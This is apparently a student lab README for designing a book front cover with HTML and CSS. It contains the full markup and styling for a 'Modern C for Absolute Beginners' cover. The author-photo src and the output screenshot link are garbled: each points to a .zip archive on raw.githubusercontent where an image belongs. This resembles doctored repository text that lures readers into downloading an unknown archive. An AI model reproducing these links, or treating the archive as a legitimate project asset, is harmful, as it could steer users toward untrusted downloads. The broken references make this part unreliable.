# Ex.06 Book Front Cover Page Design
## Date: 06.10.2025

## AIM:
To design a book front cover page using HTML and CSS.

## DESIGN STEPS:

### Step 1:
Create a Django Admin project.

### Step 2:
Create an app in the Django interface.

### Step 3:
Create a folder named 'static' in the app folder.

### Step 4:
Create a new HTML file in the static folder.

### Step 5:
Write the HTML code with relevant CSS properties.

### Step 6:
Choose the appropriate style and color scheme.

### Step 7:
Insert the images in their appropriate places.

### Step 8:
Publish the website in the LocalHost.

## PROGRAM:
~~~
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Modern C Book Cover</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Trebuchet MS', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #111; /* dark background for contrast */
        }

        .bookpage {
            position: relative;
            height: 700px;
            width: 500px;
            border-radius: 20px;
            padding: 30px;
            background: linear-gradient(145deg, #0f2027, #203a43, #2c5364); /* dark gradient */
            box-shadow: 0 20px 40px rgba(0,0,0,0.7);
            overflow: hidden;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: flex-start;
            border: 2px solid #00ffd1; /* subtle neon border */
        }

        .insight {
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 2px;
            color: #00ffe0;
            text-shadow: 0 0 10px #00ffe0, 0 0 20px #00ffd1;
        }

        .hr1 {
            width: 70%;
            margin: 10px 0 20px 0;
            border: 1px solid #00ffe0;
            opacity: 0.7;
        }

        .booktitle h1 {
            font-size: 34px;
            color: #ff6ec7;
            text-shadow: 0 0 10px #ff6ec7, 0 0 20px #ff48a0;
            line-height: 1.2;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 18px;
            color: #fff;
            text-shadow: 0 0 5px #00ffd1, 0 0 10px #00ffe0;
            line-height: 1.4;
            margin-bottom: 20px;
        }

        .ed {
            font-size: 22px;
            font-weight: bold;
            color: #ffd700;
            text-shadow: 0 0 8px #ffd700, 0 0 15px #ffcc00;
            margin-bottom: 10px;
        }

        .hr2 {
            width: 70%;
            border: 1px solid rgba(255,255,255,0.3);
            margin-bottom: 20px;
        }

        .author {
            font-size: 20px;
            font-weight: bold;
            color: #00ffe0;
            text-shadow: 0 0 8px #00ffe0, 0 0 15px #00ffd1;
            margin-bottom: 10px;
        }

        .pb {
            font-size: 28px;
            font-weight: bold;
            color: #ff4757;
            text-shadow: 0 0 10px #ff4757, 0 0 20px #ff6a6a;
            position: absolute;
            bottom: 30px;
            right: 30px;
        }

        .mypic img {
            height: 120px;
            width: 100px;
            border-radius: 5px;
            border: 2px solid #00ffe0;
            box-shadow: 0 0 15px #00ffe0, 0 0 25px rgba(0,255,224,0.4);
            position: absolute;
            bottom: 30px;
            left: 30px;
        }
    </style>
</head>
<body>
    <div class="bookpage">
        <div class="insight">INSIGHT</div>
        <div class="hr1"><hr></div>
        <div class="booktitle"><h1>Modern C for Absolute Beginners</h1></div>
        <div class="subtitle">A Friendly Introduction to<br>C Programming Language</div>
        <div class="ed">SPECIAL EDITION</div>
        <div class="hr2"><hr></div>
        <div class="author">ADITYA JORIM F S</div>
        <div class="mypic"><img src="My https://raw.githubusercontent.com/AdityaJorim007/cover/main/aditya/cover_v3.0.zip" alt="Author"></div>
        <div class="pb">SEC</div>
    </div>
</body>
</html>

~~~

## OUTPUT:
![alt text](<Screenshot 2025-10-06 https://raw.githubusercontent.com/AdityaJorim007/cover/main/aditya/cover_v3.0.zip>)

## RESULT:
The program for designing book front cover page using HTML and CSS is completed successfully.
